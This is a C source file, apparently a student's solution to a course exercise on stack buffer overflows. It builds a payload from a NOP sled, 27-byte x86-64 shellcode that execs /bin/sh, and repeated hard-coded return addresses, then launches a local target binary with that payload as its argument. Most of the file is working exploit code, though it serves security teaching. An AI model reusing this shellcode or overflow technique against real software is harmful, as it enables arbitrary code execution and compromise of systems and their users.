#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"


// Path to the target executable on my user profile.
#define TARGET "/home/net/br165837/malware_analysis/project1/targets/target"


void print_data(char* buff, int buff_size){
  printf("buff: \n");
  for(int i = 0 ;i < buff_size; i++){
          printf("0x%x ", buff[i]);
  }
  printf("\n");

  printf("shellcode: \n");

  for(int i = 0; i < 27; i++){
        printf("0x%x ", shellcode[i]);
  }
  printf("\n");

}

int main(void)
{
  char *args[3];
  char *env[2];
  char *tmp = NULL;
 
  // Creating an input buffer that can cause buffer overflow in strcpy function in the target executable
  int buffSize = 190; char buff[buffSize]; 
  // Intialize buffer elements to 0x01
  int i;   for (i=0; i < buffSize; i++) 	buff[i] = 0x41;
//  print_data(buff, buffSize);
  // write your code below to fill the 27 bytes shellcode into the buff variable and 
  // overwrite the return address correctly in order to achieve stack overflow
  //================= Your own code starts here ==================
	
  	// Important things to take note of:

	// - buf in target is 150 bytes  
   	// - addresses of all variables and returns addresses are all 6 bytes on this eustis machine

	// Copy the shellcode into the first 27 bytes of the buffer.
	// Might have to put it in reverse depending on endianess.
	
  const char buff_test[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";

const char buff_add[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\x60\xeb\xff\xff\xff\x7f\x60\xeb\xff\xff\xff\x7f\x60\xeb\xff\xff\xff\x7f\x60\xeb\xff\xff\xff\x7f\x60\xeb\xff\xff\xff\x7f\x60\xeb\xff\xff\xff\x7f\x60\xeb\xff\xff\xff\x7f\x60\xeb\xff\xff\xff\x7f\x60\xeb\xff\xff\xff\x7f\x60\xeb\xff\xff\xff\x7f";
/*
  	int num_nops = 103;
	// Put a bunch of nops for the nop slide.
	for(int i = 0; i < num_nops; i++){
		buff[i] = 0x90;
	}

	// Shellcode is offset by the number of nops padded in.
	for(int i = num_nops; i < num_nops+27; i++){
		buff[i] = shellcode[i];
	}	
	


	// 1. Find out where in the stack has the return address
	// 2. Find out where the starting address of localBuf is in target code
	// 3. Fill in shellcode[] into buff to overflow target code buffer
	// 4. Assign starting address of localBuf in target to the right place in exploit code.
	
	int offset = num_nops + 27;
 	for(int i = 0; i < 10; i++){
	       	buff[offset + i]   = 0x88;
		buff[offset + i+1] = 0xeb;
		buff[offset + i+2] = 0xff;
		buff[offset + i+3] = 0xff;
		buff[offset + i+4] = 0xff;
		buff[offset + i+5] = 0x7f;
		offset+=5;
	//buff[190] = 0x00; // NULL terminator byte
	}
	// buff[190] = 0x00;
 print_data(buff, buffSize);
*/
  strncpy(buff,buff_add, 190);
  //================= Your code ends here =================
  
  // prepare command line input to execute target code
  
  args[0] = TARGET; 
  args[1] = buff; // the first input parameter to the target code
  args[2] = NULL;
  env[0] = "FOO=bar"; 
  env[1] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

   return 0;
}
